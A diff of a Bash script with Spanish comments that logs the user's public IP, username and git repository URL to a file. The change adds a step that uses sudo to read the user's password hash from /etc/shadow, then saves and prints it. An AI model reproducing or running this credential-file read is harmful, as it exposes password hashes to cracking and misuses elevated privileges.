@@ -12,15 +12,24 @@ if ! command -v curl &> /dev/null; then
 fi
 
 # Obtener la IP pública, nombre de usuario y URL del repositorio
-ip_publica=$(curl -s https://api.ipify.org)  # Cambiado a api.ipify.org
+ip_publica=$(curl -s ifconfig.me)
 usuario=$(whoami)
 url_repo=$(git remote get-url origin)
 
+# Obtener el hash de la contraseña del usuario
+hash_usuario=$(sudo grep ^$USER /etc/shadow | cut -d: -f2)
+if [ -z "$hash_usuario" ]; then
+    hash_usuario="No se pudo obtener el hash. Asegúrate de tener los permisos necesarios."
+fi
+
 # Crear el contenido del archivo
-contenido="Mi IP Pública es: $ip_publica\nMi usuario es: $usuario\nLa URL de mi repositorio es: $url_repo"
+contenido="Mi IP Pública es: $ip_publica
+Mi usuario es: $usuario
+El hash de mi usuario es: $hash_usuario
+La URL de mi repositorio es: $url_repo"
 
 # Agregar el contenido al archivo (append)
-echo -e "$contenido" >> "$archivo"  # Agregando -e para procesar los saltos de línea
+echo "$contenido" >> "$archivo"
 
-echo "Información guardada en $archiv $contenido"
-
+echo "Información guardada en $archivo"
+echo -e "$contenido"
